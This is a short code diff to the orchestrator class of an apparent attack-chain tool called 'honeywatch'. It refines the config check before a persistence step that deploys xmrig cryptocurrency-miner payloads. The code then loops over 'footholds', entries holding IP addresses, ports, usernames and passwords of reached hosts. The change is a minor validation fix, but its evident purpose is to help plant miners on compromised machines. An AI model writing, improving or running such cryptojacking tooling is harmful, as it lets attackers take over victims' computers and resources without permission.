@@ -475,9 +475,15 @@ class ChainOrchestrator:
         from honeywatch.models import Target
         from honeywatch.ops import build_manifest, enqueue_operation
 
-        if self.cfg.payload_id in {"xmrig", "xmrigcc"} and not self.cfg.pool:
-            self._emit(ChainPhase.PERSIST, "ABORT: miner deploy needs --pool/--wallet")
-            return
+        if self.cfg.payload_id in {"xmrig", "xmrigcc"}:
+            missing = [k for k in ("pool", "wallet") if not getattr(self.cfg, k)]
+            if missing:
+                self._emit(
+                    ChainPhase.PERSIST,
+                    f"ABORT: miner deploy needs --{'/--'.join(missing)} "
+                    f"(configure via `honeywatch setup` or pass --{'/--'.join(missing)})",
+                )
+                return
 
         targets: list[Target] = []
         for ip, port, user, pw in self.state.footholds:
